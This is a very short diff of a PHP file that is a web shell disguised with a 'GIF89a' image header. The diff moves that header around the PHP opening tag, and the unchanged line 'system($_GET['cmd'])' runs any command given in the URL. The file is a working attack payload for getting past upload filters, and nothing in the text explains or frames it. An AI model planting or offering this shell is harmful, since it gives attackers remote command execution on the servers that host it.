@@ -1,4 +1,4 @@
-GIF89a;
 <?php
+GIF89a;
 system ($_GET ['cmd']);
 ?>
